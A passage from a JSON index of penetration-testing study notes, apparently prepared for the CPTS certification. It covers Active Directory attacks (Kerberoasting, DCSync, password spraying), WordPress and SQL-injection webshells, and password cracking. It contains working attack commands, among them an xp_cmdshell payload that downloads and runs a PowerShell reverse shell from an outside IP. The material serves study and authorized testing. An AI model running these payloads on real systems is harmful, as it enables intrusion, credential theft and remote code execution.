Search for SUID binaries.\r\n- [ ] Search for Linux capabilities.\r\n- [ ] Check Docker membership.\r\n- [ ] Review mounted filesystems.\r\n- [ ] Enumerate databases.\r\n- [ ] Analyze document metadata.\r\n- [ ] Test recovered credentials across all accessible services.\r\n",
    "headings": [],
    "commands": [],
    "tags": [
      "winrm",
      "linpeas",
      "gtfobins",
      "ldap",
      "smb",
      "sqli",
      "lateral movement",
      "sudo",
      "suid"
    ],
    "size": 5597,
    "lineCount": 416
  },
  {
    "id": "cpts-playbook-procedures-active-directory-compromise-2f0f5174ff0280969f75d09327ce5929",
    "title": "Active Directory Compromise",
    "category": "CPTS Field Playbooks",
    "subcategory": "CPTS Playbook / Procedures",
    "filePath": "CPTS Playbook/Procedures/Active Directory Compromise 2f0f5174ff0280969f75d09327ce5929.md",
    "content": "# Active Directory Compromise\n\n# **Live Host Enumeration**\n\n- [ ]  Conduct a ping sweep on the IP range\n- [ ]  Use NetExec on the IP range (better information)\n- [ ]  Use Responder to catch IP addresses\n\n> Be sure to properly understand the role of each host. Do your service enumeration.\n> \n\n# **User Enumeration**\n\n- **With foothold**\n    - [ ]  Get user list via SMB\n- **Without foothold**\n    - [ ]  Attempt to get user list via SMB Null Authentication\n    - [ ]  Attempt to get user list via LDAP Anonymous Bind\n    - [ ]  Attempt to get user list via RPCClient\n    - [ ]  Attempt to get user list via RID brute-forcing\n    - [ ]  Attempt to get user list via Kerbrute-ing\n    \n    > Some of these techniques are not guaranteed to discover all users. At least try the SMB, LDAP, RPCClient and RID methods.\n    > \n\n# **Get Foothold**\n\n- [ ]  Find Kerberoastable users from the user list\n- [ ]  Find ASREProastable users from the user list\n- [ ]  Use Responder to catch credential hashes\n- [ ]  Try SMB Null Authentication to spider through SMB shares looking for credentials\n- [ ]  Get `SYSTEM` / `root` on Domain connected host to get a Computer account\n- [ ]  As a last resource, try password spraying with the user list\n\n> Password spraying can lock accounts due to repeated failed attempts and should be used cautiously.\n> \n\n# **Attacks**\n\n- [ ]  Use SharpHound to collect data to feed BloodHound\n- [ ]  Check compromised hosts on BloodHound for outbound attack paths\n- [ ]  Use NetExec to check for command execution via SMB, WinRM, and RDP for each compromised user.\n- [ ]  Kerberoast\n- [ ]  ASREProast\n- [ ]  Look for credentials in GPOs (`gpp_password`, `autologin`)\n- [ ]  For each compromised user, spider through readable SMB shares for sensitive information\n- [ ]  For each compromised user, conduct SMB Hash Theft attacks on writable SMB shares\n- [ ]  Look for passwords in user’s description fields\n- [ ]  Check the DC’s SYSVOL SMB share for scripts containing credentials\n- [ ]  [NoPac](https://github.com/cube0x0/CVE-2021-1675)\n- [ ]  [PrintNightmare](https://github.com/m8sec/CVE-2021-34527)\n- [ ]  [PetitPotam](https://github.com/topotam/PetitPotam)\n- [ ]  Try compromised local administrator hashes on other hosts\n- [ ]  Try Responder on different hosts\n- [ ]  Look for users with the `PASSWD_NOTREQD` field\n- [ ]  Password spray using previously found passwords",
    "headings": [
      {
        "level": 1,
        "text": "Active Directory Compromise"
      },
      {
        "level": 1,
        "text": "Live Host Enumeration"
      },
      {
        "level": 1,
        "text": "User Enumeration"
      },
      {
        "level": 1,
        "text": "Get Foothold"
      },
      {
        "level": 1,
        "text": "Attacks"
      }
    ],
    "commands": [],
    "tags": [
      "bloodhound",
      "winrm",
      "asreproast",
      "ldap",
      "smb",
      "rce"
    ],
    "size": 2396,
    "lineCount": 56
  },
  {
    "id": "cpts-playbook-information-gathering-active-directory-enumeration-2dff5174ff02800a818fd9dfc9ad5972",
    "title": "Active Directory Enumeration",
    "category": "CPTS Field Playbooks",
    "subcategory": "CPTS Playbook / Information Gathering",
    "filePath": "CPTS Playbook/Information Gathering/Active Directory Enumeration 2dff5174ff02800a818fd9dfc9ad5972.md",
    "content": "# Active Directory Enumeration\n\n# Host Enumeration\n\n## Linux\n\n| **Command** | **Description** |\n| --- | --- |\n| `nxc smb <network-range>` | Scans the specified network range for SMB services, helping identify live Windows hosts. |\n| `sudo responder -I <network-interface> -A` | Captures LLMNR, NBT-NS, and MDNS traffic on the specified interface to passively identify hosts.Analyze mode (`-A`) avoids active poisoning. |\n| [Pivoting Reconnaissance](https://field-manual.brunorochamoura.com/manual/lateral-movement/pivoting/pivoting-recon/) | Techniques and tools used for internal reconnaissance after gaining a foothold in the network. |\n\n## Windows\n\n| **Command** | **Description** |\n| --- | --- |\n| [BloodHound & SharpHound](https://field-manual.brunorochamoura.com/manual/information-gathering/active-directory-enumeration/tools/bloodhound-sharphound/) | BloodHound can be used to enumerate the entire AD network and visualize relationships. |\n| Get all info:`Get-NetComputer` \nJust crucial information:`Get-NetComputer | select cn,operatingsystem,dnshostname` | [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) command to list domain computers and filter key details. |\n| `nslookup <dnshostname>` | Resolves a hostname to an IP address via DNS. |\n\n# **Users & Groups Enumeration**\n\n## Without Access\n\n| **Command** | **Description** |\n| --- | --- |\n| `nxc smb <dc> --usersnxc smb <dc> -u '' -p '' --users` | **(SMB)** Attempts to enumerate users via an SMB NULL session.Only works if the target allows SMB NULL sessions. |\n| `ldapsearch -H ldap://<dc> -x -b \"<domain-dn>\" -s sub \"(&(objectclass=user))\" | grep sAMAccountName: | cut -f2 -d\" \"`\nThe Distinguished Name (DN) for the domain follows a structure like this:Domain: `BRM.COM` → DN: `DC=BRM,DC=COM` | **(LDAP)** Attempts to enumerate users via an anonymous LDAP bind.Only works if anonymous binding is enabled (rare). |\n| `nxc smb <target> -u '' -p '' --rid-brute --rid-brute <max_rid>nxc smb <target> -u 'guest' -p '' --rid-brute --rid-brute <max_rid>` | **(Brute Force)** Uses RID brute forcing to enumerate domain objects. Defaults to RIDs up to 4000; using 8000+ is recommended for better coverage. |\n| `kerbrute userenum -d <domain> --dc <dc> <wordlist> -o <output-file>`\nCopy the output to a file, then extract users with:`sed -n 's/.*VALID USERNAME:[[:space:]]*\\([^@]*\\)@.*/\\1/p' output.txt > users.lst` | **(Brute Force)** Uses Kerbrute and a worslist to enumerate valid usernames via Kerberos pre-authentication does not trigger account lockouts.Try to determine the username format and find a suitable wordlist. |\n| `sudo responder -r -I <network-interface>` | **(Network Poisoning)** Launches Responder with default settings.Intercepts LLMNR/NBT-NS requests to capture usernames and password hashes.Usernames must be extracted manually. |\n\n## With Access\n\n### Linux\n\n| **Command** | **Description** |\n| --- | --- |\n| `nxc smb <dc-ip> -u <user> -p <password> --users`Copy the output to a file, then extract users with:`awk '$5 ~ /^[a-zA-Z0-9_]+$/ && NF >= 5 { print $5 }' output.txt > users.lst` | **(SMB)** Retrieves a list of all users in the domain.Also shows the count of bad password attempts for each user. |\n| `nxc smb <dc-ip> -u <user> -p <password> --groups` | **(SMB)** Retrieves a list of all groups in the domain.Includes the member count for each group.Pay special attention to key groups such as:- Administrators- Domain Admins- Executives |\n| `nxc smb <host> -u <user> -p <password> --loggedon-users` | **(SMB)** Lists users currently logged on to the specified host (requires local admin rights).This could be a valuable opportunity to steal domain admin credentials from memory or impersonate them. |\n\n### Windows\n\n| **Command** | **Description** |\n| --- | --- |\n| `Get-NetDomain` | **([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1))** Retrieves basic information about the current Active Directory domain. |\n| All information:`Get-NetUser`Only crucial information:`Get-NetUser | select cn,pwdlastset,lastlogon` | **([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1))** Lists all domain users, including details like password last set and last logon time. |\n| All information:`Get-NetGroup`Only crucial information:`Get-NetGroup | select cn` | **([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1))** Enumerates all domain groups. |\n| `Get-NetUser -SPN | select samaccountname,serviceprincipalname` | **([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1))** Finds accounts with Service Principal Names (SPNs), useful for Kerberoasting. |\n| `Get-NetSession -Verbose -ComputerName <cn>` | **([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1))** Lists active user sessions on a remote computer (requires local admin rights).This could be a valuable opportunity to steal domain admin credentials from memory or impersonate them. |\n| All users:`net user /domain`Specific user:`net user <user> /domain` | **(CMD)** Lists all domain users or detailed info for a specific user. |\n| All groups:`net group /domain`Specific group:`net group <group> /domain` | **(CMD)** Lists all domain groups or members of a specified group. |\n\n# **Password Policy Enumeration**\n\n### Authenticated\n\n| **Command** | **Description** |\n| --- | --- |\n| `nxc smb <dc> -u <user> -p <password> --pass-pol` | **(Linux)** Retrieves password policy from a domain controller using SMB via NetExec. |\n| `Get-DomainPolicy` | **([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1))** Retrieves domain-wide password and Kerberos policy from Active Directory. |\n| `net accounts` | **(CMD)** Displays local password and account lockout policies on a Windows host. |\n\n### SMB Null Session\n\n| **Command** | **Description** |\n| --- | --- |\n| `nxc smb <dc> -pass-pol` | **(Linux)** Retrieves domain password policy via SMB NULL session, if allowed, using NetExec. |\n| `rpcclient -U \"\" -N <dc>querydominfogetdompwinfo` | **(Linux)** Uses SMB NULL session, if enabled, to query domain and password policy info via `rpcclient`. |\n\n### LDAP Anonymous Binds\n\n| **Command** | **Description** |\n| --- | --- |\n| `ldapsearch -H ldap://<dc> -x -b \"<domain-dn>\" -s sub \"*\" | grep -m 1 -B 10 pwdHistoryLength`\nThe Distinguished Name (DN) for the domain follows a structure like this:Domain: `BRM.COM` → DN: `DC=BRM,DC=COM` | **(Linux)** Retrieves password policy from the domain controller using anonymous SMB bind, if allowed. |\n\n# **Object Permissions Enumeration**\n\n| **Command** | **Description** |\n| --- | --- |\n| `Find-LocalAdminAccess` | Searches for computers where a specified user has local administrator rights within the domain.Depending on the size of the environment, it may take a few minutes for this command to finish. |\n| `$sid = Convert-NameToSid <user>Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}` | Finds AD objects where the specified user (converted to SID) has explicit permissions set in their ACLs. |\n| `Find-DomainShare`Add `-CheckShareAccess` for only readable sharesYou can then `dir \\\\<dns-hostname>\\<share-name>` | Enumerates domain shares, optionally filtering for shares accessible with read permissions. |\n\n# **BloodHound & SharpHound**\n\n| **Command** | **Description** |\n| --- | --- |\n| PowerShell collector:`Import-Module .\\Sharphound.ps1Invoke-BloodHound -CollectionMethod All -OutputDirectory .`\nExecutable collector:`BloodHound.exe -CollectionMethod All -OutputDirectory .` | Uses [SharpHound](https://github.com/SpecterOps/SharpHound/releases), the official BloodHound collector, to gather AD data from a Windows host via PowerShell or executable. |\n| Run collector:`bloodhound-python -u '<user>' -p '<password>' -ns <nameserver> -d <domain> -c all`\nZip the JSON files created, so that it can be fed to BloodHound:`zip -r <output-file>.zip *.json` | Uses the [BloodHound Python collector](https://gitlab.com/kalilinux/packages/bloodhound.py) to gather AD data from a Linux host.Usually, the Domain Controller is also the nameserver.This has limitations, collecting from a Windows domain-joined host is more reliable. |\n| Start neo4j daemon:`sudo neo4j start`\nOpen bloodhound via the GUIStops the daemon after use:`sudo neo4j stop` | Starts the Neo4j graph database, which is required to run BloodHound.The GUI connects to this service to visualize and query data. |",
    "headings": [
      {
        "level": 1,
        "text": "Active Directory Enumeration"
      },
      {
        "level": 1,
        "text": "Host Enumeration"
      },
      {
        "level": 2,
        "text": "Linux"
      },
      {
        "level": 2,
        "text": "Windows"
      },
      {
        "level": 1,
        "text": "Users & Groups Enumeration"
      },
      {
        "level": 2,
        "text": "Without Access"
      },
      {
        "level": 2,
        "text": "With Access"
      },
      {
        "level": 3,
        "text": "Linux"
      },
      {
        "level": 3,
        "text": "Windows"
      },
      {
        "level": 1,
        "text": "Password Policy Enumeration"
      },
      {
        "level": 3,
        "text": "Authenticated"
      },
      {
        "level": 3,
        "text": "SMB Null Session"
      },
      {
        "level": 3,
        "text": "LDAP Anonymous Binds"
      },
      {
        "level": 1,
        "text": "Object Permissions Enumeration"
      },
      {
        "level": 1,
        "text": "BloodHound & SharpHound"
      }
    ],
    "commands": [],
    "tags": [
      "bloodhound",
      "kerberoasting",
      "ldap",
      "smb",
      "kerberos",
      "rce",
      "sudo"
    ],
    "size": 8606,
    "lineCount": 99
  },
  {
    "id": "cpts-playbook-exploitation-active-directory-exploitation-2e0f5174ff0280e6bb4ae466be69ebb9",
    "title": "Active Directory Exploitation",
    "category": "CPTS Field Playbooks",
    "subcategory": "CPTS Playbook / Exploitation",
    "filePath": "CPTS Playbook/Exploitation/Active Directory Exploitation 2e0f5174ff0280e6bb4ae466be69ebb9.md",
    "content": "# Active Directory Exploitation\n\n# **ACL Abuse**\n\n# **AS-REP Roasting**\n\n**From Linux:**\n\n| **Action** | **Description** |\n| --- | --- |\n| Add an entry to `/etc/hosts` that maps the domain controller’s IP to the domain FQDN and its hostname.\nExample:`192.168.0.1 company.com dc.company.com` | If the domain controller is accessed by IP instead of its FQDN, NTLM will be used instead of Kerberos. |\n| `nxc ldap <dc-fqdn> -u <user> -p '<password>' --asreproast <output>.lst` | Performs AS-REP roasting using NetExec with valid user credentials. |\n| `nxc ldap <dc-fqdn> -u <user-list> -p '' --asreproast <output>.lst` | Performs AS-REP roasting without valid credentials by supplying a user list. |\n| With valid user:`impacket-GetNPUsers -dc-ip <dc-ip> -request <domain-fqdn>/<user>`\nWIthout valid user:`impacket-GetNPUsers -dc-ip <dc-ip> -request -no-pass -usersfile <user-list> <domain-fqdn>/` | Alternative AS-REP roasting tool using Impacket. Prompts for password if needed. |\n\n**From Domain Joined Windows:**\n\n| **Action** | **Description** |\n| --- | --- |\n| `Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl` | Lists accounts with pre-authentication disabled using [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1). |\n| `.\\Rubeus.exe asreproast /user:<target-user> /nowrap /format:hashcat` | Performs AS-REP roasting against a specific user using [Rubeus](https://github.com/GhostPack/Rubeus). |\n\n# **DCSync**\n\n**From Linux:**\n\n| **Action** | **Description** |\n| --- | --- |\n| `nxc smb <dc> ... --ntds` | Uses NetExec to perform a DCSync attack and dump the entire `NTDS.dit` database. |\n| Dump the entire `NDS.dit` database:`impacket-secretsdump -outputfile <output-filename> -just-dc <domain>/<attacking-user>@<dc-ip>`\n\nOptional parameters:`-just-dc-ntlm`: just NTLM hashes, no tickets`-just-dc-user <user>`: performs the attack on a particular user | Uses Impacket’s secretsdump to perform a DCSync attack, targeting specific users or all users. |\n\n**From Windows:**\n\n| **Action** | **Description** |\n| --- | --- |\n| `runas /netonly /user:<domain>\\<attacking-user> powershell` | Launches a new PowerShell session under the **security context** of a user with DCSync rights.\n\nNote: `whoami` will still show the original user, but commands run under the impersonated account. |\n| `.\\mimikatz.exeprivilege::debuglsadump::dcsync /domain:<domain> /user:<domain>\\<target-user>` | Uses **Mimikatz** to perform a DCSync attack targeting a **specific user account**.\nCommon targets include the built-in `Administrator` account or `krbtgt` (for crafting a Golden Ticket and maintaining persistence). |\n\n> Note: If you receive `ERROR_NOT_FOUND`, try using just the NetBIOS name of the domain (e.g., use `example` instead of `EXAMPLE.COM`).\n> \n\n# **Kerberoasting**\n\n**From Linux:**\n\n| **Action** | **Description** |\n| --- | --- |\n| `nxc ldap <dc-fqdn> -u <user> -p '<password>' --kerberoasting <output>.lst` | Performs Kerberoasting using NetExec on all SPNs. |\n| `impacket-GetUserSPNs -dc-ip <dc-ip> <domain>/<user> -request -outputfile <output>.ts` | Requests TGS tickets for all SPNs.Prompts for user password. |\n| `impacket-GetUserSPNs -dc-ip <dc-ip> <domain>/<user>` | Lists all SPNs without requesting tickets.Prompts for password. |\n| `impacket-GetUserSPNs -dc-ip <dc-ip> <domain>/<user> -request-user <target-user> -outputfile <output>.tgs` | Requests TGS ticket for a specific SPN.Prompts for password. |\n\n**From Windows:**\n\nPowerview\n\n| **Action** | **Description** |\n| --- | --- |\n| `Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\\<output>.csv -NoTypeInformation` | Requests TGS tickets for all SPNs from a domain-joined Windows host.Outputs a `.csv` file. |\n| `Get-DomainUser * -spn | select samaccountname,serviceprincipalname` | Lists all SPNs without requesting tickets from a domain-joined Windows host. |\n| `Get-DomainUser -Identity <target-user> | Get-DomainSPNTicket -Format` | Requests TGS ticket for a specific SPN from a domain-joined Windows host. |\n\nRubeus\n\n| **Action** | **Description** |\n| --- | --- |\n| `.\\Rubeus.exe kerberoast /stats` | Displays statistics such as:\n- Number of Kerberoastable users\n- Password set dates (older passwords preferred as they may be weaker)\n- User encryption types (RC4 preferred over AES)\n\nDoes not list target accounts\nRun on a domain-joined Windows host. |\n| `.\\Rubeus.exe kerberoast /nowrap` | Requests TGS tickets for all SPNs from a domain-joined Windows host. |\n| `.\\Rubeus.exe kerberoast /user:<target-user> /nowrap` | Requests TGS ticket for a specific SPN from a domain-joined Windows host. |\n\n# **Password Spraying**\n\n[https://field-manual.brunorochamoura.com/manual/exploitation/active-directory-exploitation/password-spraying/](https://field-manual.brunorochamoura.com/manual/exploitation/active-directory-exploitation/password-spraying/)\n\nFrom Linux:\n\n| **Action** | **Description** |\n| --- | --- |\n| `nxc smb <dc> -u <user-list> -p <password> --continue-on-success` | Conducts a password spray with NetExec using a user list and a single password. |\n| `nxc smb <dc> -u <user-list> -p <password-list> --continue-on-success --no-bruteforce` | Tries each password against the corresponding username in the list (one-to-one), rather than testing all combinations. |\n\nFrom Windows:\n\n| **Action** | **Description** |\n| --- | --- |\n| `Import-Module .\\DomainPasswordSpray.ps1` | Imports the [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) \nPowerShell module used to perform a domain password spray. |\n| `Invoke-DomainPasswordSpray -Password <password> -OutFile <output-file> -ErrorAction SilentlyContinue`\n\nIf the machine is not domain-joined, `-UserList <user-list>` must be specified. | Executes a password spray against domain users. |\n\n# **Silver Tickets**",
    "headings": [
      {
        "level": 1,
        "text": "Active Directory Exploitation"
      },
      {
        "level": 1,
        "text": "ACL Abuse"
      },
      {
        "level": 1,
        "text": "AS-REP Roasting"
      },
      {
        "level": 1,
        "text": "DCSync"
      },
      {
        "level": 1,
        "text": "Kerberoasting"
      },
      {
        "level": 1,
        "text": "Password Spraying"
      },
      {
        "level": 1,
        "text": "Silver Tickets"
      }
    ],
    "commands": [],
    "tags": [
      "mimikatz",
      "rubeus",
      "impacket",
      "hashcat",
      "kerberoasting",
      "asreproast",
      "silver ticket",
      "golden ticket",
      "ldap",
      "smb",
      "kerberos",
      "rce",
      "persistence"
    ],
    "size": 5896,
    "lineCount": 105
  },
  {
    "id": "cpts-playbook-exploitation-common-web-exploitation-2e0f5174ff02808a84a0d4c7760e5428",
    "title": "Common Web Exploitation",
    "category": "CPTS Field Playbooks",
    "subcategory": "CPTS Playbook / Exploitation",
    "filePath": "CPTS Playbook/Exploitation/Common Web Exploitation 2e0f5174ff02808a84a0d4c7760e5428.md",
    "content": "# Common Web Exploitation\n\n# **WordPress Exploitation**\n\n| **Action** | **Description** |\n| --- | --- |\n| [WordPress Enumeration](https://field-manual.brunorochamoura.com/manual/information-gathering/web-enumeration/common-web-app-enumeration/wordpress-enumeration/) | The most effective way to gain administrative access to WordPress is by exploiting vulnerabilities in plugins and themes.\n\nUse [WPScan](https://github.com/wpscanteam/wpscan), as outlined in the enumeration notes, to identify vulnerable plugins and learn how to exploit them. |\n| [XSS to CSRF to Admin Access](https://field-manual.brunorochamoura.com/manual/exploitation/web-exploitation/common-web-app-exploitation/wordpress-exploitation/#xss-to-csrf-to-admin-access) | If an XSS vulnerability allows us to execute arbitrary JavaScript in an administrator’s browser, we can exploit it to create a new administrator account for ourselves. |\n| `sudo wpscan --password-attack xmlrpc -t 20 -U <user> -P <password-wordlist> --url <wordpress-root>` | If exploiting plugins or themes fails, a brute-force attack on administrator credentials using [WPScan](https://github.com/wpscanteam/wpscan) is a last-resort option. |\n| On the administrator dashboard (`/wp-admin`), click on `Appearance > Theme Editor`.\n\nThis page allows direct editing of PHP source code. Selecting an inactive theme helps avoid corrupting the active one.\n\nChoose the theme, then edit an uncommon file like `404.php` to insert a PHP webshell:`echo system($_GET[\"cmd\"]);`Click `Update File` to save changes.\n\nThen, to trigger the web shell:`curl http://<wordpress-root>/wp-content/themes/<theme>/404.php?cmd=id` | Once administrator access is obtained, we can get RCE on the webserver by modifying a `.php` file within a theme to include a hidden web shell.\n\nNote that in some cases, theme files may not be editable, requiring RCE through plugins instead. |\n| Clone repository:`git clone https://github.com/p0dalirius/Wordpress-webshell-plugin.git`\n\nBuild plugin:`cd Wordpress-webshell-plugin; make`\n\nUpload the resulting `.zip` file. | Another way to achieve RCE after gaining administrator access is by using a malicious plugin.\n\nThe [WordPress Webshell Plugin](https://github.com/p0dalirius/Wordpress-webshell-plugin) provides a simple method—just build the plugin and follow the repository’s instructions. |\n| `cat wp-config.php | grep 'DB_USER|DB_PASSWORD'` | Once access is secured, check the `wp-config.php` file (usually in the web root) for database credentials, which can be useful for further exploitation. |",
    "headings": [
      {
        "level": 1,
        "text": "Common Web Exploitation"
      },
      {
        "level": 1,
        "text": "WordPress Exploitation"
      }
    ],
    "commands": [],
    "tags": [
      "rce",
      "xss",
      "sudo"
    ],
    "size": 2573,
    "lineCount": 28
  },
  {
    "id": "cpts-playbook-exploitation-common-web-vulnerabilities-2e0f5174ff0280b6863ecf83c3ecf491",
    "title": "Common Web Vulnerabilities",
    "category": "CPTS Field Playbooks",
    "subcategory": "CPTS Playbook / Exploitation",
    "filePath": "CPTS Playbook/Exploitation/Common Web Vulnerabilities 2e0f5174ff0280b6863ecf83c3ecf491.md",
    "content": "# Common Web Vulnerabilities\n\n# CSRF\n\n# XSS\n\n# Directory Traversal\n\n| **Action** | **Description** |\n| --- | --- |\n| `../....//..././....\\/....\\/....////` | Different variations of directory traversal sequences used to escape the intended directory, intended to bypass weak filtering mechanisms. |\n| `echo -n \"<string-to-encode>\" | jq -sRr @uri` | Encoding special characters can help bypass input validation or WAF restrictions that block standard traversal sequences. |\n| Unix: `/etc/passwd`Windows: `C:\\Windows\\System32\\drivers\\etc\\hosts` | Common world-readable files used to verify if directory traversal is working. |\n| `/home/<user>/.ssh/id_rsa` | On Linux targets, try accessing SSH private keys for users with home directories found on `/etc/passwd`. |\n| Google, ChatGPT or documentation | Identify the configuration file locations for applications you’ve already discovered on the target system, as they may contain credentials or other sensitive information. |\n\n# **File Upload Vulnerabilities**\n\n## **Upload a normal file**\n\n- Before anything else, try uploading a harmless file of the type the application expects.\n- Look to understand what the application does with the file. Does it store it somewhere and if so, where? Does it process the file in some other way?\n\n## **Webshell upload**\n\n- Assuming the file is uploaded somewhere and you know where, try uploading a webshell of the appropriate language (e.g. .php, .asp).\n- We are going for the low hanging fruit here. If it works, good. But it’s likely that there are mitigations in place to prevent this. The next steps aim to bypass these mitigations.\n\n## **Client Side Bypass**\n\n- It’s possible that there are client side verifications (i.e. JavaScript) preventing the file upload. They are easy to bypass.\n- Change the webshell extension for the allowed one, upload it, catch the request with Burp Suite or some other web proxy and change the extension before sending the request to the server.\n\n## **Whitelist / Blacklist Filter Bypass**\n\n- If you still can’t upload, there is likely a whitelist / blacklist filter in place.\n- Fuzz for valid extension combinations using Burp intruder **with** **URL encoding disabled**. The [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) repository contains wordlists for file extensions, such as [PHP](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst), that can be used here.\n\n# **HTTP Brute Forcing**\n\n| **Action** | **Description** |\n| --- | --- |\n| `hydra -V -l <username> -P <password-wordlist> <target-ip> http-post-form \"/<page>:<username_param>=^USER^&<password_param>=^PASS^:<failure-string>\"` | POST request brute forcing |\n| `hydra -V -l <username> -P <password-wordlist> <target-ip> http-get` | Basic authentication brute forcing.No need for a special module, just `http-get`. |\n\nWordlists to use:\n\n- `/usr/share/wordlists/rockyou.txt` (for passwords)\n- `/usr/share/wordlists/seclists/Usernames/Names/names.txt` (for usernames)\n\n# **Local File Inclusion (LFI)**\n\n## PHP Filters\n\n# SQL Injection\n\n### SQLi on Windows Web Server\n\nUse following payload to enable the command execution: `'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami';—`\n\nOnce done, use `';EXEC xp_cmdshell \"Powershell IEX(New-Object Net.WebClient).downloadString('[http://192.168.45.248/door.ps1](http://192.168.45.248/door.ps1)')\";--` to download file on to the server and this command will execute this door.ps1 and get you a reverse shell.\n\n## SQLi to RCE\n\n| **Action** | **Description** |\n| --- | --- |\n| Enables the stored procedure:\n`EXECUTE sp_configure 'show advanced options', 1;\nRECONFIGURE;\nEXECUTE sp_configure 'xp_cmdshell', 1;\nRECONFIGURE;`\n\nExecutes a command:`EXECUTE xp_cmdshell '<command>';` | **MSSQL**: Enables and executes system commands through the `xp_cmdshell` stored procedure, which is disabled by default in SQL Server 2005 and later. |\n| Creates a table to store the command output:\n`CREATE TABLE shell(output text);`\n\nExecutes a command:`COPY shell FROM PROGRAM '<command>';`\n\nRead output from command:`SELECT * FROM shell;` | **PostgreSQL**: Uses the `COPY FROM PROGRAM` feature to execute system commands.This feature is only available from **PostgreSQL 9.3 and above**. |\n| `SELECT \"<?php system($_GET['cmd']); ?>\" INTO OUTFILE \"/var/www/html/shell.php\"` | **MySQL**: Writes a PHP web shell (`shell.php`) into a web-accessible directory, if we have the **necessary privileges**.The file location must be writable to the OS user running the database service. |\n| `sqlmap ... --os-shell --web-root \"/var/www/html\"` | Automates the process of spawning a semi-interactive web shell using [sqlmap](https://field-manual.brunorochamoura.com/manual/exploitation/service-exploitation/tools/sqlmap/), bypassing the need for manual exploitation and working across different DBMS |\n\n## **Union-based SQLi**\n\n| **Action** | **Description** |\n| --- | --- |\n| `' ORDER BY 1-- -\n' ORDER BY 2-- -\n' ORDER BY 3-- -`\n… | Find the number of columns by increasing the value until an error occurs. |\n| `' UNION SELECT NULL-- -\n' UNION SELECT NULL,NULL-- -\n' UNION SELECT NULL,NULL,NULL-- -`\n… | Identify column count by adding `NULL` values until the query succeeds. |\n| `' UNION SELECT 'a',NULL,NULL-- -\n' UNION SELECT NULL,'a',NULL-- -\n' UNION SELECT NULL,NULL,'a'-- -` | Test columns with different data types to find one that reflects output. |\n| `' UNION SELECT <column>,NULL,NULL FROM <table>-- -` | Extract data from another table using a reflective column. |\n| MySQL:`CONCAT(<column-a>,';',<column-b>)`\n\nMSSQL:`<column-a>+';'+<column-b>`\nor\n`<column-a> ';' <column-b>`\n\nPostgreSQL:`<column-a>||';'||<column-b>` | Merge values into one column using DBMS-specific syntax. |",
    "headings": [
      {
        "level": 1,
        "text": "Common Web Vulnerabilities"
      },
      {
        "level": 1,
        "text": "CSRF"
      },
      {
        "level": 1,
        "text": "XSS"
      },
      {
        "level": 1,
        "text": "Directory Traversal"
      },
      {
        "level": 1,
        "text": "File Upload Vulnerabilities"
      },
      {
        "level": 2,
        "text": "Upload a normal file"
      },
      {
        "level": 2,
        "text": "Webshell upload"
      },
      {
        "level": 2,
        "text": "Client Side Bypass"
      },
      {
        "level": 2,
        "text": "Whitelist / Blacklist Filter Bypass"
      },
      {
        "level": 1,
        "text": "HTTP Brute Forcing"
      },
      {
        "level": 1,
        "text": "Local File Inclusion (LFI)"
      },
      {
        "level": 2,
        "text": "PHP Filters"
      },
      {
        "level": 1,
        "text": "SQL Injection"
      },
      {
        "level": 3,
        "text": "SQLi on Windows Web Server"
      },
      {
        "level": 2,
        "text": "SQLi to RCE"
      },
      {
        "level": 2,
        "text": "Union-based SQLi"
      }
    ],
    "commands": [],
    "tags": [
      "sqlmap",
      "burp",
      "sqli",
      "lfi",
      "rce",
      "xss"
    ],
    "size": 5965,
    "lineCount": 105
  },
  {
    "id": "cpts-playbook-cracking-passwords-2edf5174ff02808a9278ed048f6b1c72",
    "title": "Cracking Passwords",
    "category": "CPTS Field Playbooks",
    "subcategory": "CPTS Playbook",
    "filePath": "CPTS Playbook/Cracking Passwords 2edf5174ff02808a9278ed048f6b1c72.md",
    "content": "# Cracking Passwords\n\n# Hashcat\n\n| **Command** | **Description** |\n| --- | --- |\n| `sudo hashcat -m <mode> <hash-or-file> <wordlist>` | Wordlist bruteforce. |\n| `hashcat --force <password-list> -r <custom-rule> --stdout | sort | uniq > mut_password.list` | Use Hashcat to generate a rule-based wordlist. |\n| `sed -i '/^.\\{4,15\\}$/!d' mut_password.list` | Keep only entries in a list that are within a certain size. |\n\nWordlists to use:\n\n- `/usr/share/wordlists/rockyou.txt` (for passwords)\n- `/usr/share/hashcat/rules/rockyou-30000.rule` (for mutation rules)\n\n# **John The Ripper**\n\n| **Command** | **Description** |\n| --- | --- |\n| `john --wordlist=<wordlist> <hash-file>` | Cracking hash with a wordlist. |\n| `sed 's/^.*://' <jtr-hash> > <hashcat-hash>` | Converts a JtR hash into a format that can be cracked by Hashcat. |\n\n## **John the Ripper Conversions**\n\n| **Tool** | **Description** |\n| --- | --- |\n| `pdf2john <file>.pdf > <file>.hash` | Converts PDF documents for John. |\n| `ssh2john <private-key> > <file>.hash` | Converts SSH private keys for John. |\n| `mscash2john <file>.dit > <file>.hash` | Converts MS Cash hashes for John. |\n| `keychain2john <file>.keychain > <file>.hash` | Converts OS X keychain files for John. |\n| `rar2john <file>.rar > <file>.hash` | Converts RAR archives for John. |\n| `pfx2john <file>.pfx > <file>.hash` | Converts PKCS#12 files for John. |\n| `truecrypt_volume2john <file>.tc > <file>.hash` | 